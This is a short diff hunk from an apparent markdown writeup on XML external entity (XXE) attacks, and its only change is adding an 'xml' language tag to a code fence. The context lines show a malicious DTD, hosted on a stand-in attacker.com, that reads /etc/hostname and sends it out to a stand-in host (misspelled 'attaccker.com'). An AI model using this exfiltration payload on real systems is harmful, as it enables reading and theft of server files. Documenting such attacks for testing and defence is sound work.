@@ -63,7 +63,7 @@
 
 1. Start a web server and host on `http://attacker.com/example.dtd` this malicious dtd.
 
-```
+```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attaccker.com/?x=%file;'>">
 %stack;
